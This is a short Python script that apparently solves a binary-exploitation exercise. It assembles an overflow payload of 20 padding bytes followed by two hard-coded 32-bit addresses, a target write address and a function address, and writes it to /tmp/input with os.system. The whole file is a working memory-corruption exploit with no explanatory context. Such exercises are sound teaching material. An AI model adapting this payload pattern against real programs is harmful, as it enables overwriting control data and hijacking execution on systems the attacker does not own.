#!/usr/bin/python

import os

mAddr = "\x08\x04\x84\xf4"[::-1]
writeAddr = "\x08\x04\x99\x28"[::-1]
payload = "\"" + 20*"A" + writeAddr + "\" \"" + mAddr + "\""
cmd = "echo " + payload + " > /tmp/input"
os.system(cmd)
